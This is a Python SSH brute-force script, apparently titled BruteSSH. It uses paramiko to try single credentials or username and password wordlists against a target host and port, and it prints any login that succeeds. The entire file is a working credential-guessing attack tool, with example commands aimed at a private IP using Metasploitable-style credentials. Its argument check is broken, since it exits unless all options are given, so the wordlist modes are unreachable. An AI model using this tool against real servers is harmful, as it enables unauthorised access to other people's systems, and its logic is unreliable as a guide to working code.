import paramiko
from optparse import OptionParser

parser = OptionParser("""

'########::'########::'##::::'##:'########:'########:::::'######:::'######::'##::::'##:
 ##.... ##: ##.... ##: ##:::: ##:... ##..:: ##.....:::::'##... ##:'##... ##: ##:::: ##:
 ##:::: ##: ##:::: ##: ##:::: ##:::: ##:::: ##:::::::::: ##:::..:: ##:::..:: ##:::: ##:
 ########:: ########:: ##:::: ##:::: ##:::: ######::::::. ######::. ######:: #########:
 ##.... ##: ##.. ##::: ##:::: ##:::: ##:::: ##...::::::::..... ##::..... ##: ##.... ##:
 ##:::: ##: ##::. ##:: ##:::: ##:::: ##:::: ##::::::::::'##::: ##:'##::: ##: ##:::: ##:
 ########:: ##:::. ##:. #######::::: ##:::: ########::::. ######::. ######:: ##:::: ##:
........:::..:::::..:::.......::::::..:::::........::::::......::::......:::..:::::..::

                                                                
                                                                                                                                          
                            			@0x3mr                        
                                                    
script.py [option]
--------------------
-t 	 :: Set Your Specific Target.
--pnum   :: Set The Ports number.
-u       :: Set The Username.
-p       :: Set The Password.
-U       :: Set The Username List.
-P       :: Set The Password List.

EX:
    - BruteSSH.py -t 192.168.1.1 --pnum 22 -u "msfadmin" -p "msfadmin"
    - BruteSSH.py -t 192.168.1.1 --pnum 22 -U Users.txt -P Passwords.txt
     
""")

parser.add_option("-t", dest = "target", type = "string", help = "Your Target")
parser.add_option("--pnum", dest = "port", type = "int", help = "port number")
parser.add_option("-u", dest = "username", type = "string", help = "Username")
parser.add_option("-p", dest = "password", type = "string", help = "Password")
parser.add_option("-U", dest = "file_username", type = "string", help = "Usernames' File")
parser.add_option("-P", dest = "file_passwords", type = "string", help = "Passwords' File")

(options, args) = parser.parse_args()

def SSHClient(ip, port, username, password):
    req = paramiko.SSHClient()

    req.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        req.connect(ip, port, username=username, password=password)
        print("Login Successful .. ! And")
        print("username:", username, "password:", password)
        req.close()
        exit()

    except:
        print("Login falied ..!")

def openUsersFile(filename):
    Users = []
    with open(filename, "r") as usersFile:
        for user in usersFile:
            user = user.strip()
            Users.append(user)
    return Users


def openPasswordFile(filename):
    password = []
    with open(filename, "r") as passFile:
        for passwords in passFile:
            passwords = passwords.strip()
            password.append(passwords)
    return password



ip = options.target
port = options.port
username = options.username
password = options.password
userlist = options.file_username
passlist = options.file_passwords


if ip == None or port == None or username == None or password == None or userlist == None or passlist == None:
    print(parser.usage)
    exit(0)


else:
    # With Username and Password
    if username and password:

        SSHClient(ip, port, username, password)

    # With PassWord List And username
    elif username and passlist:

        passwords = openPasswordFile(passlist)
        for password in passwords:
            SSHClient(ip, port, username, password)

    # With Username List And Password
    elif userlist and password:

        users = openUsersFile(userlist)
        for username in users:
              SSHClient(ip, port, username, password)


    # With PassWord List And Username List
    elif userlist and passlist:
        users = openUsersFile(userlist)
        passwords = openPasswordFile(passlist)

        for username in users:
            for password in passwords:
                SSHClient(ip, port, username, password)